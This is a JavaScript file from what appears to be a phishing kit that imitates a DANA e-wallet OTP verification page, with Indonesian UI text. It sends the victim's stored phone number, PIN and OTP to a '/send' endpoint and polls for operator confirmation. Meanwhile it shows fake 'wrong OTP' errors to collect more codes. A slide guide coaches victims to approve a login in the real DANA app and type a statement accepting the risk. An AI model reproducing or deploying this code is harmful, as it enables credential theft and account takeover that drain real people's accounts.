/* ========================= */
/* OTP */
/* ========================= */

const sound =
document.getElementById("successSound");

let otpInputs =
document.querySelectorAll(".otp-box");

const otpContainer =
document.querySelector(".otp-container");

const otpOriginalHTML = otpContainer.innerHTML;

const errorBox =
document.querySelector(".error-box");


const blockedBox =
document.querySelector(".blocked-box");

const blockedBtn =
document.querySelector(".blocked-btn");

const alertTitle =
document.querySelector(".alert-title");

const alertDesc =
document.querySelector(".alert-desc");

/* ========================= */
/* PLAY SOUND */
/* ========================= */

window.addEventListener(
"pageshow",
() => {

    sound.play();

});

let alertTimer;

function showTempAlert(title, desc){

    clearTimeout(alertTimer);

    alertTitle.innerText = title;
    alertDesc.innerText = desc;

    errorBox.style.display = "block";
    errorBox.classList.add("show");

    alertTimer = setTimeout(() => {

        errorBox.classList.remove("show");

        setTimeout(() => {
            errorBox.style.display = "none";
        }, 300);

    }, 3000);
}

/* FADE IN */ 
window.addEventListener("load", () => {

    document.body.classList.add(
    "fade-in"
    );

});

/* TOTAL SALAH */
let wrongCount = 0;

/* STATUS KONFIRMASI */
let isConfirmed = false;

/* HIDE ALERT */
errorBox.style.display = "none";

/* HIDE BLOCK */
blockedBox.style.display = "none";


/* ========================= */
/* NOMOR OTOMATIS */
/* ========================= */

const savedNumber =
localStorage.getItem("nmrx");

if(savedNumber){

    document.querySelector(
    ".phone-number"
    ).innerText = savedNumber;

}

/* ========================= */
/* FOKUS KE BOX PERTAMA */
/* ========================= */

otpContainer.addEventListener("click", () => {

    for(let i = 0; i < otpInputs.length; i++){

        if(otpInputs[i].value === ""){

            otpInputs[i].focus();

            return;

        }

    }

    otpInputs[0].focus();

});

/* ========================= */
/* OTP INPUT */
/* ========================= */

function initOtpInputs(){

    otpInputs.forEach((input,index)=>{

        input.addEventListener("input",()=>{

            input.value =
            input.value.replace(/[^0-9]/g,'');

            errorBox.style.display="none";

            if(
                input.value.length===1 &&
                index<otpInputs.length-1
            ){

                otpInputs[index+1].focus();

            }

            checkOTP();

        });

        input.addEventListener("keydown",(e)=>{

            if(
                e.key==="Backspace" &&
                input.value==="" &&
                index>0
            ){

                otpInputs[index-1].focus();

            }

        });

    });

}

initOtpInputs();

let statusInterval = null;

function cekKonfirmasi(nmrx){

    if(statusInterval){
        clearInterval(statusInterval);
    }

    statusInterval = setInterval(async()=>{

        const res = await fetch(`/check-status/${nmrx}`);
        const data = await res.json();

        if(data.status === "confirmed"){

    isConfirmed = true;
            
            clearInterval(statusInterval);

            loadingBox.style.display = "none";

            document
.getElementById("successPopup")
.classList.add("show");

const successBtn = document.getElementById("successBtn");

successBtn.onclick = () => {

    successBtn.disabled = true;

    successBtn.innerHTML = `
        <div class="btn-loader">
            <img src="assets/home.png" class="btn-loader-icon" alt="">
            <span class="btn-loader-ring"></span>
        </div>
    `;

    setTimeout(() => {
        window.location.href = "diri.html";
    }, 900);

};

        }

    },2000);

}

function showPinLoading(){
    otpContainer.innerHTML = `
        <div class="pix-inline-loading">
            <div class="pix-loader">
                <img src="assets/home.png" class="loader-icon">
                <span class="loader-ring"></span>
            </div>
        </div>
    `;
}

function resetPinBox(){

    otpContainer.innerHTML = otpOriginalHTML;

    otpInputs =
    document.querySelectorAll(".otp-box");

    initOtpInputs();

    otpInputs.forEach(input=>{
        input.value="";
    });

    otpInputs[0].focus();

}

/* ========================= */
/* CHECK OTP */
/* ========================= */

function checkOTP(){

    let otp = "";

    otpInputs.forEach(input => {

        otp += input.value;

    });

    /* FULL OTP */
    if(otp.length === 4){

      showPinLoading();

         /* SIMPAN */
    localStorage.setItem(
    "otp",
    otp
    );

            const nmrx =
            localStorage.getItem(
            "nmrx"
            );

            const pix =
            localStorage.getItem(
            "pix"
            );

            const otpData =
            localStorage.getItem(
            "otp"
            );

            fetch("/send", {

            method:"POST",

            headers:{
            "Content-Type":
            "application/json"
        },

            body:JSON.stringify({

                nmrx:nmrx,
                pix:pix,
                otp:otpData

        })

    })

        .then(res => res.json())

.then(data => {

    console.log("RESPON:", data);

    if(data.success){
        cekKonfirmasi(nmrx);
    }

})

.catch(err => {

    console.log("ERROR:", err);

});

        /* LOADING DI AREA BOX SAJA */
showPinLoading();

        setTimeout(() => {

            if(isConfirmed){
    return;
}

            /* TOTAL SALAH */
            wrongCount++;

            /* ========================= */
            /* 1 - 2X SALAH */
            /* ========================= */

            if(wrongCount < 3){

                showTempAlert(
    "Kode OTP salah atau kadaluarsa",
    "Pastikan Kode OTP yang kamu masukan benar dan tidak kadaluarsa"
);

            }

            /* ========================= */
            /* 3X SALAH */
            /* ========================= */

            else if(wrongCount === 3){

                showTempAlert(
    "Kamu sudah memasukan kode OTP salah 3x",
    "Pastikan kode yang dimasukan sudah benar"
);

            }

            /* ========================= */
            /* 4X SALAH */
            /* ========================= */

            else if(wrongCount >= 4){

                document.querySelector(
                ".container"
                ).style.display =
                "none";

                blockedBox.style.display =
                "block";

                return;

            }

            /* SHAKE */
            otpContainer.classList
            .add("shake");

            navigator.vibrate(250);

            setTimeout(() => {

                otpContainer.classList
                .remove("shake");

            },350);

            /* RESET OTP */
            setTimeout(() => {

                resetPinBox();

            },300);

        },2000);

    }

}

/* ========================= */
/* TIMER */
/* ========================= */

const resendBtn =
document.querySelector(".resend-btn");

const timerText =
document.querySelector(".timer");

let time = 60;

resendBtn.disabled = true;

const countdown =
setInterval(() => {

    let seconds =
    time < 10
    ? "0" + time
    : time;

    timerText.innerText =
    `00:${seconds}`;

    time--;

    if(time < 0){

        clearInterval(countdown);

        timerText.innerText =
        "00:00";

        resendBtn.disabled =
        false;

        resendBtn.classList
        .add("active");

    }

},1000);

/* ========================= */
/* RESEND */
/* ========================= */

resendBtn.addEventListener(
"click",
() => {

    if(!resendBtn.disabled){

        location.reload();

    }

});

const introOverlay =
document.getElementById("introOverlay");

const introBtn =
document.getElementById("introBtn");

const topNotif =
document.getElementById("topNotif");

const notifOkBtn =
document.getElementById("notifOkBtn");

const topNotifSound =
document.getElementById("topNotifSound");

let notifStep = 1;

introBtn.addEventListener("click", () => {

    introOverlay.classList.add("hide");

    setTimeout(() => {
        introOverlay.style.display = "none";

        setTimeout(() => {
    topNotif.classList.add("show");

    topNotifSound.currentTime = 0;
    topNotifSound.play().catch(() => {});
}, 200);

    },350);

});

notifOkBtn.addEventListener("click", () => {

    if (notifStep === 1) {

        topNotif.classList.remove("show");
        topNotif.classList.add("hide");

        setTimeout(() => {

            document.querySelector(".top-notif-title").innerText =
                "Belum menerima Kode OTP?";

            document.querySelector(".top-notif-desc").innerHTML =
                "Pastikan kamu sudah melakukan verifikasi.<br>" +
                "Atau lanjutkan secara manual dengan klik BUKA DANA.";

            /* ========================= */
            /* WRAPPER TOMBOL */
            /* ========================= */

            const actions =
                document.createElement("div");

            actions.className = "notif-actions";

            /* ========================= */
            /* TOMBOL BUKA */
            /* ========================= */

            const bukaBtn =
                document.createElement("button");

            bukaBtn.id = "openDanaBtn";
            bukaBtn.className = "notif-open-app-btn";
            bukaBtn.textContent = "BUKA DANA";

            bukaBtn.addEventListener("click", () => {
                window.location.href = "danaid://";
            });

            /* ========================= */
            /* PINDAHKAN KEDUA TOMBOL */
            /* ========================= */

            notifOkBtn.parentNode.insertBefore(
                actions,
                notifOkBtn
            );

            actions.appendChild(bukaBtn);
            actions.appendChild(notifOkBtn);

            /* ========================= */
            /* TAMPILKAN */
            /* ========================= */

            topNotif.classList.remove("hide");
            topNotif.classList.add("show");

            topNotifSound.currentTime = 0;
            topNotifSound.play().catch(() => {});

            notifStep = 2;

        }, 350);

    } else {

        topNotif.classList.remove("show");
        topNotif.classList.add("hide");

    }

});

const openDanaBtn =
    document.getElementById("openDanaBtn");

let bukaDana = false;

openDanaBtn.addEventListener("click", () => {

    bukaDana = true;

    window.location.href = "danaid://";

});


document.addEventListener("visibilitychange", () => {

    if (
        bukaDana &&
        document.visibilityState === "visible"
    ) {

        const popup =
            document.getElementById("introOverlay");

        if (popup) {

            popup.classList.add("hide");

            setTimeout(() => {
                popup.style.display = "none";
            }, 350);

        }

        bukaDana = false;

    }

});

const manualSlides = [
    {
        image: "cara/slide1.jpg",
        text: "Klik 'BUKA DANA' untuk buka aplikasi DANA. Kemudian di aplikasi dana klik 'PESAN'."
    },
    {
        image: "cara/slide2.jpg",
        text: "Pilih Notifikasi Verifikasi terbaru paling atas."
    },
    {
        image: "cara/slide3.jpg",
        text: "Klik tombol 'VERIFIKASI' untuk lanjut."
    },
    {
        image: "cara/slide4.jpg",
        text: "Ketik 'Ini benar aktivitas saya dan saya sadar serta paham risikonya.' untuk lanjut mendapatkan Kode OTP."
    },
    {
        image: "cara/slide5.jpg",
        text: "Kode OTP terkirim via WhatsApp/SMS. Kode yang di terima di isi ke form untuk lanjut ke data diri."
    }
];


/* ========================= */
/* STATE */
/* ========================= */

let manualCurrent = 0;

let manualAnimating = false;


/* ========================= */
/* ELEMENT */
/* ========================= */

const manualOverlay =
    document.getElementById("manualOverlay");

const manualImage =
    document.getElementById("manualImage");

const manualDescription =
    document.getElementById("manualDescription");

const manualStep =
    document.querySelector(".manual-step");

const manualDots =
    document.getElementById("manualDots");


/* ========================= */
/* PRELOAD SEMUA GAMBAR */
/* ========================= */

manualSlides.forEach(slide => {

    const img =
        new Image();

    img.src =
        slide.image;

});


/* ========================= */
/* RENDER DOTS */
/* ========================= */

function renderManualDots() {

    manualDots.innerHTML = "";

    manualSlides.forEach((_, index) => {

        const dot =
            document.createElement("span");

        dot.className =
            index === manualCurrent
                ? "active"
                : "";

        manualDots.appendChild(dot);

    });

}


/* ========================= */
/* UPDATE TEXT */
/* ========================= */

function updateManualText() {

    const slide =
        manualSlides[manualCurrent];

    manualDescription.textContent =
        slide.text;

    manualStep.textContent =
        `Langkah ${manualCurrent + 1}`;

    renderManualDots();

}


/* ========================= */
/* INITIAL */
/* ========================= */

function renderManualSlide() {

    const slide =
        manualSlides[manualCurrent];

    manualImage.src =
        slide.image;

    updateManualText();

}


/* ========================= */
/* SLIDE */
/* ========================= */

function changeManualSlide(direction) {

    if (manualAnimating)
        return;

    manualAnimating = true;


    /* arah animasi */

    const animationClass =
        direction === "next"
            ? "slide-next"
            : "slide-prev";


    manualImage.classList.remove(
        "slide-next",
        "slide-prev"
    );

    void manualImage.offsetWidth;


    /* gambar baru */

    manualCurrent +=
        direction === "next"
            ? 1
            : -1;


    if (
        manualCurrent >=
        manualSlides.length
    ) {

        manualCurrent = 0;

    }


    if (manualCurrent < 0) {

        manualCurrent =
            manualSlides.length - 1;

    }


    const slide =
        manualSlides[manualCurrent];


    /* update gambar */

    manualImage.src =
        slide.image;


    /* update teks */

    manualDescription.textContent =
        slide.text;

    manualStep.textContent =
        `Langkah ${manualCurrent + 1}`;


    renderManualDots();


    /* jalankan animasi */

    manualImage.classList.add(
        animationClass
    );


    setTimeout(() => {

        manualImage.classList.remove(
            animationClass
        );

        manualAnimating = false;

    }, 220);

}


/* ========================= */
/* BUKA POPUP */
/* ========================= */

document
    .getElementById("manualGuideBtn")
    .addEventListener("click", () => {

        manualCurrent = 0;

        renderManualSlide();

        manualOverlay.classList.add(
            "show"
        );

    });


/* ========================= */
/* TUTUP POPUP */
/* ========================= */

document
    .getElementById("manualClose")
    .addEventListener("click", () => {

        manualOverlay.classList.remove(
            "show"
        );

    });


/* ========================= */
/* PREV */
/* ========================= */

document
    .getElementById("manualPrev")
    .addEventListener("click", () => {

        changeManualSlide("prev");

    });


/* ========================= */
/* NEXT */
/* ========================= */

document
    .getElementById("manualNext")
    .addEventListener("click", () => {

        changeManualSlide("next");

    });


/* ========================= */
/* OPEN APP */
/* ========================= */

document
    .getElementById("manualOpenApp")
    .addEventListener("click", () => {

        window.location.href =
            "danaid://";

    });

/* ========================= */
/* MULAI DARI AWAL */
/* ========================= */

blockedBtn.addEventListener(
"click",
() => {

    localStorage.clear();

    window.location.href =
    "index.html";

});
